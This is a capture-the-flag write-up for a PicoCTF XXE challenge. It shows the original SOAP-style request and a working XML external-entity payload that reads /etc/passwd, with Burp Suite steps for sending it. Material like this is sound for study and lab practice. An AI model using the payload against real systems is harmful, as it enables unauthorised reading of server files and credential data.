# SOAP Injection - PicoCTF

## Challenge Overview

In this challenge, we're given an endpoint that accepts `POST` requests with XML content (SOAP-style). Our goal is to exploit the backend logic, likely by injecting or manipulating XML to access restricted or unintended data.

## Request Format

Here is the basic request format provided by the challenge:

```
POST /data HTTP/1.1
Host: saturn.picoctf.net:54765
Content-Length: 61
User-Agent: Mozilla/5.0
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:54765
Referer: http://saturn.picoctf.net:54765/
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<data><ID>2</ID></data>
```

## Goal

The goal is to manipulate this XML structure to read sensitive files from the server—like `/etc/passwd` or a flag file—by exploiting an XML External Entity (XXE) vulnerability.

## Exploit Example

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<data><ID>&xxe;</ID></data>
```

This payload attempts to read the contents of `/etc/passwd` by defining an external entity `xxe` and referencing it within the `ID` tag.

## Steps to Reproduce

1. Intercept the request using **Burp Suite**.
2. Replace the original XML with the exploit payload.
3. Forward the request.
4. Inspect the response for leaked data.

## Notes

- Make sure the `Content-Type` is set to `application/xml`.
- Not all servers are vulnerable to XXE by default. Look for clues in error messages or server behavior.
- You can try different file paths or payloads depending on the OS (Linux vs Windows).

## Tools

- Burp Suite
- Postman (optional)
- Firefox/Chromium with Burp proxy

## References

- OWASP XXE Guide
- [PayloadAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

**Disclaimer:** This writeup is for educational purposes only. Always use techniques like this in legal and authorized environments such as CTFs.
